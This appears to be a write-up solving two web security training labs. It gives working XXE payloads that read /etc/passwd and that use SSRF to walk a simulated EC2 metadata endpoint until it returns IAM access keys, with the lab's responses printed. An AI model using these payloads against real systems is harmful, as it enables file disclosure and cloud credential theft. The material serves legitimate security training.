
# Lab 1

## Description

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

To solve the lab, inject an XML external entity to retrieve the contents of the `/etc/passwd` file.

## Solution

Look for the check stock request in burp. Then send it to repeater and add the following:

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

to the request:

```
[...]
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

so it looks like this:

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

Don't forget to reference the `ENTITY` inside the XML tags.

Sending the request returns the content of the file and solves the lab.



# Lab 2

## Description

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is `http://169.254.169.254/`. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.

To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint.

## Solution

As before find the request check stock, then send it repeater. To perform an internal SSRF request via XXE use the following structure:

```
`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>`
```

As the description suggests, replacing the URL with `http://169.254.169.254/` like this:

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

returns:

```
"Invalid product ID: latest"
```

Which is probably only part of the URL path. Indeed inputting:

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

returns:

```
"Invalid product ID: meta-data"
```

then:

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

returns:

```
"Invalid product ID: iam"
```

then:

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

returns:

```
"Invalid product ID: security-credentials"
```

then:

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

returns:

```
"Invalid product ID: admin"
```

then finally:

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

returns:

```
"Invalid product ID: {
  "Code" : "Success",
  "LastUpdated" : "2025-12-23T06:16:37.321413757Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "1rKoiNFJOVGwnyHlsYjU",
  "SecretAccessKey" : "zndSTthMeIiUuUGRpvbR1bU0YZaWMHtT64VqNlqS",
  "Token" : "HgKhupwJ3FxweXFXHkf7anjhIS22fc1FtCaJK8h8JBF9luM5ekLYAZWWVGQ2nlTG8RIHPdqunrE6Jh1ffAxHCqx0ByANT2Y8W6GuABoIyU5cOv0yy4RkWemFA0lMko0KcHU4ysGJELlFTPg64mqyZryCatq3BGQunTUueIs1zwoPr84xxw070Z2yn5jDYyZuWmzsU6wAgstXyA42E4vuR2ZXxuV9rh2THcNc0wdOW7yUXxLAT3yRa7toHgevxKTz",
  "Expiration" : "2031-12-22T06:16:37.321413757Z"
}"
```

which solves the lab.

